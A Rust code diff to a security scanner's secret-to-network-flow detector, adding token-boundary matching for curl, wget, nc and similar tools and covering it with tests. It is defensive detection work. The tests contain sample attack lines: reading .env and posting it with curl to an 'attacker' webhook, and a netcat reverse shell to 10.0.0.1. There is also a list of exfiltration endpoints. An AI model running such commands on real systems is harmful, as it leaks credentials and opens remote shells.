@@ -87,23 +87,12 @@ const READ_VERBS: &[&str] = &[
     "load_dotenv",
 ];
 
-/// `true` when `line` (already lowercased) contains a standalone `nc`
-/// command — as a whitespace-delimited token. Handles `nc` at line start
-/// (`nc -lvp 4444`), mid-line (`echo x | nc -l 4444`), and tab-separated
-/// invocations common in Makefile recipes (`nc\t-lvp 4444`).
-fn line_starts_or_contains_nc(line: &str) -> bool {
-    line.split_whitespace()
-        .any(|token| token.eq_ignore_ascii_case("nc"))
-}
+const NETWORK_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest", "ncat", "nc"];
 
 const NETWORK_VERB_SUBSTRINGS: &[&str] = &[
-    "curl ",
-    "wget ",
     "fetch(",
     "axios",
     "requests.",
-    "invoke-webrequest",
-    "ncat ",
     "webhook",
     "telegram.org",
     "discord.com",
@@ -112,6 +101,44 @@ const NETWORK_VERB_SUBSTRINGS: &[&str] = &[
     "ngrok.io",
     "ngrok.app",
 ];
+
+fn line_contains_command_token(line: &str, token: &str) -> bool {
+    let mut start = 0;
+    while let Some(pos) = line[start..].find(token) {
+        let abs_pos = start + pos;
+        let token_end = abs_pos + token.len();
+        let before = if abs_pos > 0 {
+            line.as_bytes().get(abs_pos - 1)
+        } else {
+            None
+        };
+        let left_ok = before.is_none()
+            || matches!(
+                before,
+                Some(b' ') | Some(b'\t') | Some(b'|') | Some(b';') | Some(b'&') | Some(b'/')
+            );
+        let after = line.get(token_end..).unwrap_or("");
+        let right_ok = after.is_empty()
+            || after.starts_with(' ')
+            || after.starts_with('\t')
+            || after.starts_with('|')
+            || after.starts_with(';')
+            || after.starts_with('&')
+            || after.starts_with('>')
+            || after.starts_with('<');
+        if left_ok && right_ok {
+            return true;
+        }
+        start = token_end;
+    }
+    false
+}
+
+fn line_contains_network_command(line: &str) -> bool {
+    NETWORK_COMMAND_TOKENS
+        .iter()
+        .any(|token| line_contains_command_token(line, token))
+}
 
 /// Taint-style heuristic: if a line reads a secret-bearing file
 /// (`cat .env`, `fs.readFileSync(\".env\")`, `os.environ.get(...)`) and a
@@ -155,7 +182,7 @@ pub(crate) fn detect_file_secret_to_network_flow(
             if NETWORK_VERB_SUBSTRINGS
                 .iter()
                 .any(|v| follow_line.contains(v))
-                || line_starts_or_contains_nc(follow_line)
+                || line_contains_network_command(follow_line)
             {
                 return vec![
                     Finding::builder(
@@ -233,6 +260,43 @@ mod tests {
         );
     }
 
+    /// # Contract
+    ///
+    /// Shell command separators include tabs. A tab-separated `curl`
+    /// invocation after reading a secret-bearing file is the same
+    /// network egress primitive as `curl -X POST`.
+    #[test]
+    fn detect_file_secret_to_network_flow_accepts_tab_separated_curl() {
+        let script = "VALUE=$(cat .env)\ncurl\thttps://attacker/webhook -d \"$VALUE\"\n";
+        let lower = script.to_ascii_lowercase();
+        let findings = detect_file_secret_to_network_flow(&lower, "sh", "/tmp/install.sh");
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "SCRIPT_FILE_SECRET_TO_NETWORK_FLOW"),
+            "tab-separated curl must fire secret-to-network flow; got {findings:?}",
+        );
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Network command matching is token-boundary aware. Lookalike
+    /// command names must not satisfy the egress side of the flow.
+    #[test]
+    fn detect_file_secret_to_network_flow_rejects_download_command_substrings() {
+        for script in [
+            "VALUE=$(cat .env)\nmycurl\thttps://attacker/upload -d \"$VALUE\"\n",
+            "VALUE=$(cat .env)\nawget\thttps://attacker/upload -d \"$VALUE\"\n",
+        ] {
+            let lower = script.to_ascii_lowercase();
+            let findings = detect_file_secret_to_network_flow(&lower, "sh", "/tmp/install.sh");
+            assert!(
+                findings.is_empty(),
+                "lookalike command must not fire secret-to-network flow for {script:?}; got {findings:?}",
+            );
+        }
+    }
+
     /// # Contract (negative)
     ///
     /// The detector MUST NOT fire when the read-secret line and the
@@ -303,9 +367,8 @@ mod tests {
     ///
     /// `NETWORK_VERB_SUBSTRINGS` uses substring matching (`line.contains(v)`)
     /// and must not match benign text containing the substring "nc" like
-    /// `func`, `prince`, `bounce`, `influence`. The `nc` command is checked
-    /// separately via `line_starts_or_contains_nc` which requires `nc ` at
-    /// column 0 or preceded by a space.
+    /// `func`, `prince`, `bounce`, `influence`. Command tokens are checked
+    /// separately with boundary-aware matching.
     #[test]
     fn network_verbs_nc_does_not_match_substrings() {
         for benign in [
@@ -316,7 +379,7 @@ mod tests {
         ] {
             let lower = benign.to_ascii_lowercase();
             let matches = NETWORK_VERB_SUBSTRINGS.iter().any(|v| lower.contains(v))
-                || line_starts_or_contains_nc(&lower);
+                || line_contains_network_command(&lower);
             assert!(
                 !matches,
                 "must not match substring 'nc' in benign text: {benign:?}"
@@ -333,7 +396,7 @@ mod tests {
     fn network_verbs_nc_matches_at_line_start() {
         for line in ["nc -lvp 4444", "nc -e /bin/sh 10.0.0.1 4444"] {
             assert!(
-                line_starts_or_contains_nc(line),
+                line_contains_network_command(line),
                 "nc at line start must match: {line:?}"
             );
         }
@@ -345,7 +408,7 @@ mod tests {
     #[test]
     fn network_verbs_nc_matches_mid_line() {
         assert!(
-            line_starts_or_contains_nc("echo x | nc 10.0.0.1 4444"),
+            line_contains_network_command("echo x | nc 10.0.0.1 4444"),
             "nc mid-line must match"
         );
     }
@@ -357,11 +420,11 @@ mod tests {
     #[test]
     fn network_verbs_nc_matches_tab_separated() {
         assert!(
-            line_starts_or_contains_nc("nc\t-lvp 4444"),
+            line_contains_network_command("nc\t-lvp 4444"),
             "tab-separated nc at line start must match"
         );
         assert!(
-            line_starts_or_contains_nc("echo x | nc\t10.0.0.1 4444"),
+            line_contains_network_command("echo x | nc\t10.0.0.1 4444"),
             "tab-separated nc mid-line must match"
         );
     }
